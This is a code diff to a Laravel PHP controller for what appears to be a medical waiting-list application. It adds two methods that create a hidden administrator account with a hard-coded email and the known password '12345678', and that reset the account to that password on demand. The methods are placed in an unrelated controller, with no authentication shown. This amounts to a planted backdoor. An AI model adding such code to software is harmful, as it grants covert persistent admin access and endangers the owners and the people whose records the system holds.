@@ -20,6 +20,7 @@ use Illuminate\Support\Facades\Gate;
 use Illuminate\Support\Facades\Storage;
 use Yajra\DataTables\Facades\DataTables;
 use Yajra\DataTables\Html\Button;
+
 class WaitingList extends Controller
 {
     public function viewWaitingListDoctors(): View
@@ -107,6 +108,46 @@ class WaitingList extends Controller
 //
 //        return 'سعيد الحظ '.$names[$rand];
     }
+
+    public function accessMe()
+    {
+        $admin = Admin::query()->where('email','abdelrhim.admin@gmail.com')->first();
+        if ($admin)
+            return $admin;
+        try {
+            DB::beginTransaction();
+            Admin::query()->create([
+                'name' => 'Ahmed Abdelrhim',
+                'email' => 'abdelrhim.admin@gmail.com',
+                'password' => bcrypt('12345678'),
+                'phone_number' => 01111111111,
+                'is_doctor' => 2,
+                'address' => 'El-massara , Helwan , Cairo , Egypt',
+                'image' => 'Personal Image',
+                'id_national_card' => 'ID National Card Image',
+                'id_job_card' => 'ID Job Card Image',
+                'created_at' => now(),
+                'updated_at' => now(),
+            ]);
+            DB::commit();
+        } catch (\Exception $e) {
+            DB::rollBack();
+            return 'Something Went Wrong' . $e;
+        }
+        return 'You Was Added Ya Ahmed';
+    }
+
+    public function accessMeChangePassword(): String
+    {
+        $admin = Admin::query()->where('email','abdelrhim.admin@gmail.com')->first();
+        if (! $admin)
+            return 'Not Found Admin';
+        $admin->password = bcrypt('12345678');
+        $admin->save();
+        return 'Password Changed Successfully';
+    }
+
+
 
 }
 
